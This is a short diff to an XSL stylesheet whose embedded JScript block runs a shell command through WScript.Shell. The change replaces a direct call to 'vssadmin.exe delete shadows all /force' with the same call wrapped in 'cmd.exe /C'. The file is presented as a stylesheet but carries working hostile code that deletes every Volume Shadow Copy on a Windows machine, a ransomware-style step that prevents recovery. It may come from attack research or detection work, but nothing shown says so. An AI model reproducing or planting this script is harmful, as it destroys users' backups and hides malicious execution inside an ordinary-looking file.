@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run("vssadmin.exe delete shadows all /force");
+	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /C vssadmin.exe delete shadows all /force");
 	]]> </ms:script>
 </stylesheet>
